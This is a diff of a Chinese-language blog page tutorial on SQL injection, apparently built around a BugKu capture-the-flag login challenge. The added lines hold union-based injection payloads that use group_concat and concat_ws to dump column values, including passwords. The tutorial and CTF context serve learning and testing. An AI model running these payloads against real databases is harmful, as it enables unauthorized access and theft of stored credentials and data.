@@ -156,7 +156,7 @@
 <meta property="og:image" content="http://klaus-1258823634.cos.ap-beijing.myqcloud.com/2019/03/31/5ed1729512398c2473ab0bddb9eadfe9.png">
 <meta property="og:image" content="http://klaus-1258823634.cos.ap-beijing.myqcloud.com/2019/03/31/4b5404fb9c8dce61ee127ef40ed2a2c8.png">
 <meta property="og:image" content="http://klaus-1258823634.cos.ap-beijing.myqcloud.com/2019/03/31/68090038bb89c715a86fd1ff0da3f3ef.png">
-<meta property="og:updated_time" content="2019-07-02T09:56:25.000Z">
+<meta property="og:updated_time" content="2019-07-12T12:19:56.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全--SQL注入攻击">
 <meta name="twitter:description" content="SQL注入是发生于应用程序与数据库层的安全漏洞，在输入的字符串中注入SQL指令，如果程序忽略了字符检查或检查不完善，就可能会导致恶意SQL指令被执行。通过CTF赛题和一些模拟渗透环境，总结了一些SQL注入攻击的常用方法。">
@@ -436,7 +436,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-02 17:56:25" itemprop="dateModified" datetime="2019-07-02T17:56:25+08:00">2019-07-02</time>
+                <time title="Modified: 2019-07-12 20:19:56" itemprop="dateModified" datetime="2019-07-12T20:19:56+08:00">2019-07-12</time>
               
             
           </span>
@@ -564,9 +564,17 @@
 <p><code>id=&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;对应数据库名称&#39; and table_name=&#39;对应表名&#39;)，3#</code></p>
 </li>
 <li><p>查询字段值</p>
-<p><code>id=&#39; union select 1, 2,对应列名 from 对应表名#</code></p>
+<p><code>id=1&#39; union select 1, 2,对应列名 from 对应表名#</code></p>
+<p><code>id=1&#39; union select null,concat_ws(char(32,58,32),列名1，列名2) from 表名 #</code></p>
+<p><code>id=1&#39; union select group_concat(列名1,列名2,列名3),group_concat(password) from 表名 #</code></p>
+<p><code>id=1&#39; union select null,concat_ws(char(32,58,32),列名1，列名2...) from 表名 #</code></p>
+<p><code>id=1&#39; union select null,group_concat(concat_ws(char(32,58,32),列名1,列名2....)) from 表名 #</code></p>
 </li>
 </ol>
+<ul>
+<li><code>group_concat</code>：将相同的行组合起来，在一行显示。</li>
+<li><code>concat_ws</code>：N个字段组合到一起，用第一个参数分割显示，空字符会自动跳过。</li>
+</ul>
 <h4 id="附：以上都是显注的一般利用方法，盲注则要自己利用函数构造玄学语句进行SQL攻击。"><a href="#附：以上都是显注的一般利用方法，盲注则要自己利用函数构造玄学语句进行SQL攻击。" class="headerlink" title="附：以上都是显注的一般利用方法，盲注则要自己利用函数构造玄学语句进行SQL攻击。"></a>附：以上都是显注的一般利用方法，盲注则要自己利用函数构造玄学语句进行SQL攻击。</h4><h5 id="接下来以BugKu上的一道题为例实战一番，链接如下："><a href="#接下来以BugKu上的一道题为例实战一番，链接如下：" class="headerlink" title="接下来以BugKu上的一道题为例实战一番，链接如下："></a>接下来以BugKu上的一道题为例实战一番，链接如下：</h5><p><a href="这是一个神奇的登录框"><a href="http://123.206.87.240:9001/sql/" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a></a></p>
 <h4 id="解题方法如下："><a href="#解题方法如下：" class="headerlink" title="解题方法如下："></a>解题方法如下：</h4><ol>
 <li><p>首先我们看到这是个登录界面，很显然这是POST方式，因为要“GO GO GO”提交数据而不是在url中直接修改参数。</p>
@@ -606,9 +614,7 @@
 <p>得到flag。</p>
 </li>
 </ol>
-<h6 id="当然这只是基础题，在实际的注入中会复杂的多，需要我们能巧妙地构造sql语句、利用各种奇技淫巧绕过过滤手段。Keep-going"><a href="#当然这只是基础题，在实际的注入中会复杂的多，需要我们能巧妙地构造sql语句、利用各种奇技淫巧绕过过滤手段。Keep-going" class="headerlink" title="当然这只是基础题，在实际的注入中会复杂的多，需要我们能巧妙地构造sql语句、利用各种奇技淫巧绕过过滤手段。Keep going!"></a>当然这只是基础题，在实际的注入中会复杂的多，需要我们能巧妙地构造sql语句、利用各种奇技淫巧绕过过滤手段。Keep going!</h6><p>​    </p>
-<p>​    </p>
-
+<h6 id="当然这只是基础题，在实际的注入中会复杂的多，需要我们能巧妙地构造sql语句、利用各种奇技淫巧绕过过滤手段。Keep-going"><a href="#当然这只是基础题，在实际的注入中会复杂的多，需要我们能巧妙地构造sql语句、利用各种奇技淫巧绕过过滤手段。Keep-going" class="headerlink" title="当然这只是基础题，在实际的注入中会复杂的多，需要我们能巧妙地构造sql语句、利用各种奇技淫巧绕过过滤手段。Keep going!"></a>当然这只是基础题，在实际的注入中会复杂的多，需要我们能巧妙地构造sql语句、利用各种奇技淫巧绕过过滤手段。Keep going!</h6>
       
     </div>
 
